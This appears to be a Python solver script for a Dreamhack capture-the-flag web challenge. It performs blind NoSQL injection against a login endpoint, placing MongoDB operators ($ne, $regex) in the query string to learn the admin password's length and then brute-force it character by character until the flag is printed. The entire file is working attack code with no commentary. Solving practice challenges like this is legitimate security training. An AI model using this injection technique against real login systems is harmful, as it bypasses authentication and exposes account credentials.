import requests
from Helpers import *
from Brute import *

TARGET_URL = 'http://host1.dreamhack.games:19745'

def checkLen(l):
    l=l*'.'
    res = requests.get(f"{TARGET_URL}/login?uid[$ne]=guest&upw[$regex]=^{l}$")
    if res.text=="admin":
        return True
    else:
        return False

def checkChar(i,ch):
    pat="^"+i*"."+ch+".*"
    res = requests.get(f"{TARGET_URL}/login?uid[$ne]=guest&upw[$regex]={pat}")
    if res.text=="admin":
        return True
    else:
        return False

def main():
    options=Helpers.getOptions()
    options['checkChar']=checkChar
    options['checkLen']=checkLen
    brute = Brute(**options)
    flag=brute.run(5)
    print(flag)
main()